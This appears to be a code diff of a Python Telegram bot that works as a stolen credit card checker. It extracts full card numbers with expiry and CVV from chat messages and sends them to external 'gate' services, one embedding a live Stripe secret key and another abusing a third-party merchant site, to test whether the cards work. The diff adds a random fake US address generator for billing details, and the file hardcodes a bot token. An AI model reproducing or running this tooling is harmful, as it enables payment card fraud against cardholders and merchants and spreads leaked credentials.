@@ -1,145 +1,107 @@
 import telebot
 import httpx
 import re
-import time
+import random
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
 
-# --- CONFIGURATION ---
+# --- CONFIG ---
 TOKEN = "8318488317:AAFyfOLjIAY-p8GaJXmPlhXCu82R3_XEqgU"
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
-
-# Use a thread pool for parallel API calls (The "Both" feature)
 executor = ThreadPoolExecutor(max_workers=10)
 
-# --- UI COMPONENTS ---
+# --- ADDRESS DATA ---
+def generate_address():
+    first_names = ["John", "Alex", "Robert", "Emma", "Sarah", "Michael"]
+    last_names = ["Smith", "Jones", "Williams", "Brown", "Wilson", "Taylor"]
+    streets = ["Main St", "High St", "Maple Ave", "Park Blvd", "2nd St"]
+    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
+    
+    fn = random.choice(first_names)
+    ln = random.choice(last_names)
+    return (
+        f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
+        f"🏠 <b>Street:</b> <code>{random.randint(100, 999)} {random.choice(streets)}</code>\n"
+        f"🏙 <b>City:</b> <code>{random.choice(cities)}</code>\n"
+        f"📍 <b>State:</b> <code>NY</code>\n"
+        f"📮 <b>Zip:</b> <code>{random.randint(10001, 99999)}</code>\n"
+        f"🌎 <b>Country:</b> <code>United States</code>"
+    )
 
-def get_main_keyboard():
+# --- KEYBOARDS ---
+def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.add(
         types.KeyboardButton("💳 Check Card"), 
-        types.KeyboardButton("👤 My Profile"),
-        types.KeyboardButton("📊 Stats"),
-        types.KeyboardButton("🛠 Support")
+        types.KeyboardButton("🏠 Address Gen"),
+        types.KeyboardButton("👤 My Profile")
     )
     return markup
 
 def get_gate_inline(cc_data):
     markup = types.InlineKeyboardMarkup()
-    btn1 = types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gate_sk|{cc_data}")
-    btn2 = types.InlineKeyboardButton("🔥 AUTO STRIPE", callback_data=f"gate_as|{cc_data}")
-    btn3 = types.InlineKeyboardButton("🚀 CHECK BOTH GATES", callback_data=f"gate_both|{cc_data}")
+    # Fixed Callback Data Format
+    btn1 = types.InlineKeyboardButton("⚡ SK", callback_data=f"sk|{cc_data}")
+    btn2 = types.InlineKeyboardButton("🔥 Auto", callback_data=f"as|{cc_data}")
+    btn3 = types.InlineKeyboardButton("🚀 BOTH GATES", callback_data=f"both|{cc_data}")
     markup.row(btn1, btn2)
     markup.row(btn3)
     return markup
 
-# --- CORE API ENGINE ---
-
+# --- API HELPER ---
 def request_api(gate, cc):
-    """Handles the heavy lifting of API calls."""
     try:
-        if "sk" in gate:
+        if gate == "sk":
             url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={cc}"
         else:
             url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={cc}"
             
         with httpx.Client(timeout=25.0) as client:
-            start_time = time.time()
-            response = client.get(url)
-            elapsed = round(time.time() - start_time, 2)
-            
-            # Clean response text
-            text = response.text.strip()
-            if not text: text = "No Response from API"
-            
-            return {"status": "success", "data": text, "time": elapsed}
+            res = client.get(url).text.strip()
+            return res if res else "No Response"
     except Exception as e:
-        return {"status": "error", "data": str(e), "time": 0}
+        return f"Error: {str(e)}"
 
 # --- HANDLERS ---
 
 @bot.message_handler(commands=['start'])
-def welcome(message):
-    welcome_txt = (
-        f"<b>Welcome, {message.from_user.first_name}!</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🤖 <b>Bot Status:</b> 🟢 <code>ONLINE</code>\n"
-        f"💳 <b>Available Gates:</b> 02\n"
-        f"🛡 <b>Security:</b> <code>ENCRYPTED</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"<i>Paste your card details to begin.</i>"
-    )
-    bot.send_message(message.chat.id, welcome_txt, reply_markup=get_main_keyboard())
+def start(message):
+    bot.send_message(message.chat.id, "<b>🚀 Bot Active!</b>\nSelect an option:", reply_markup=main_menu())
+
+@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
+def addr_gen(message):
+    bot.send_message(message.chat.id, f"<b>✅ Random Address Generated:</b>\n\n{generate_address()}")
 
 @bot.message_handler(func=lambda m: m.text == "💳 Check Card")
-def check_prompt(message):
-    bot.send_message(message.chat.id, "<b>📥 Send your card details:</b>\n<code>CC|MM|YY|CVV</code>", parse_mode="HTML")
+def prompt_cc(message):
+    bot.send_message(message.chat.id, "<b>📥 Send Card:</b> <code>CC|MM|YY|CVV</code>")
 
 @bot.message_handler(func=lambda m: True)
-def auto_detect_cc(message):
-    # Advanced regex: detects cards even if they are in the middle of a sentence
-    cards = re.findall(r'\d{15,16}[\s|/|-]\d{1,2}[\s|/|-]\d{2,4}[\s|/|-]\d{3,4}', message.text)
-    
-    if not cards:
-        return
+def detect(message):
+    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
+    if cards:
+        bot.reply_to(message, f"💳 <b>Card:</b> <code>{cards[0]}</code>", reply_markup=get_gate_inline(cards[0]))
 
-    for cc in cards[:5]: # Limit to 5 per message for stability
-        # Normalize the card format to | separator
-        clean_cc = cc.replace(" ", "|").replace("/", "|").replace("-", "|")
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    try:
+        # Check if callback data is valid
+        if "|" not in call.data: return
         
-        caption = (
-            f"<b>💳 Card Detected</b>\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"📦 <b>BIN:</b> <code>{clean_cc[:6]}</code>\n"
-            f"🔢 <b>Format:</b> <code>{clean_cc}</code>\n"
-            f"━━━━━━━━━━━━━━"
-        )
-        bot.send_message(message.chat.id, caption, reply_markup=get_gate_inline(clean_cc))
+        gate, cc = call.data.split("|")
+        bot.edit_message_text(f"⏳ <b>Checking...</b>\n<code>{cc}</code>", call.message.chat.id, call.message.message_id)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("gate_"))
-def process_check(call):
-    _, gate_type, cc = call.data.split("|")
-    
-    # Update UI to loading state
-    bot.edit_message_text(
-        f"<b>🔍 PROCESSING REQUEST...</b>\n━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n⚙️ <i>Running algorithms...</i>",
-        call.message.chat.id, call.message.message_id
-    )
+        if gate == "both":
+            f1 = executor.submit(request_api, "sk", cc)
+            f2 = executor.submit(request_api, "as", cc)
+            res = f"<b>🔹 SK:</b> <code>{f1.result()}</code>\n<b>🔹 Auto:</b> <code>{f2.result()}</code>"
+        else:
+            res = f"<b>📝 Result:</b> <code>{request_api(gate, cc)}</code>"
 
-    if gate_type == "both":
-        # Run BOTH APIs in parallel threads
-        future_sk = executor.submit(request_api, "sk", cc)
-        future_as = executor.submit(request_api, "as", cc)
+        bot.edit_message_text(f"<b>✅ Done</b>\n💳 <code>{cc}</code>\n\n{res}", call.message.chat.id, call.message.message_id)
         
-        res_sk = future_sk.result()
-        res_as = future_as.result()
-        
-        final_msg = (
-            f"<b>✅ DUAL CHECK COMPLETE</b>\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"💳 <b>CARD:</b> <code>{cc}</code>\n\n"
-            f"⚡ <b>SK BASED:</b>\n┗ <code>{res_sk['data']}</code> (⏱ {res_sk['time']}s)\n\n"
-            f"🔥 <b>AUTO STRIPE:</b>\n┗ <code>{res_as['data']}</code> (⏱ {res_as['time']}s)\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"👤 <b>Checked by:</b> {call.from_user.first_name}"
-        )
-    else:
-        # Single Gate Check
-        res = request_api(gate_type, cc)
-        gate_name = "SK BASED" if gate_type == "sk" else "AUTO STRIPE"
-        
-        final_msg = (
-            f"<b>✅ CHECK COMPLETE</b>\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"💳 <b>CARD:</b> <code>{cc}</code>\n"
-            f"⚙️ <b>GATE:</b> <code>{gate_name}</code>\n"
-            f"📝 <b>RESULT:</b> <code>{res['data']}</code>\n"
-            f"⏱ <b>TIME:</b> <code>{res['time']}s</code>\n"
-            f"━━━━━━━━━━━━━━"
-        )
+    except Exception as e:
+        bot.answer_callback_query(call.id, "⚠️ Error processing click")
+        print(f"Callback Error: {e}")
 
-    bot.edit_message_text(final_msg, call.message.chat.id, call.message.message_id)
-
-# --- START BOT ---
-print("--- Bot Started Successfully ---")
 bot.infinity_polling()
